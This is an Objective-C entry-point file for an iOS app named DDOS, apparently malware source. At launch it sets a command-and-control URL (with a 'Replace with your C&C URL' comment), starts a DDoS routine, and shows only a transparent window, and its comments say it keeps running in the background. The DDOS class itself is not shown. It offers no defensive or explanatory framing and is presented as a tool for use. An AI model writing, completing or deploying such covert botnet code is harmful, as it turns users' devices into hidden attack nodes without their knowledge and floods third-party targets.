//
//  main.m
//  DDOS
//  Entry point for DDOS application
//

#import <UIKit/UIKit.h>
#import "DDOS.h"

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    // Initialize DDOS
    DDOS *ddos = [[DDOS alloc] init];
    [ddos setLink:@"https://example.com/api"]; // Replace with your C&C URL
    [ddos startDDOS];
    
    // Create invisible window
    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.backgroundColor = [UIColor clearColor];
    self.window.rootViewController = [[UIViewController alloc] init];
    [self.window makeKeyAndVisible];
    
    return YES;
}

- (void)applicationDidEnterBackground:(UIApplication *)application {
    // Keep running in background
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
    // Resume if needed
}

@end

int main(int argc, char * argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
